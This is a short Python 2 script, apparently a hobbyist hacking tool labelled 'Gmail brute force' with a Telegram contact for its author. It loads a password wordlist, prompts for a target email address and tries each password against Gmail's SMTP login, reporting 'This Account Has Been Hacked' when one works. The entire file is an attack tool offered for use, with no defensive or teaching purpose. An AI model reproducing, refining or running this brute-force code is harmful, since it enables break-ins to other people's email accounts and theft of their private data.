import smtplib
from os import system
import sys

def logo():


  print '======================================================='
  print '=            create by hacker ghost                   ='
  print '======================================================='
  print '=             Gmail brute force                       ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=                     V.1.0                           ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=  contact me on telegram https://t.me/nahom_0ghost   ='
  print '======================================================='

system('clear')
logo()

print '[1] start the attack'
print '[2] exit the program'
option = input('===>')
if option == 1:
   file_path = raw_input('path of the word list :')
else:
   system('clear')
   exit()
passw_file = open(file_path,'r')
passw_list = passw_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in passw_list:
      i = i + 1
      print str(i) + '/' + str(len(passw_list))
      try:
         server.login(user_name, password)
         system('clear')
         logo()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password  
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            logo()
            print '[+] this account has been hacked, password :' + password  

            break
         else:
            print '[!] password not found => ' + password
login()
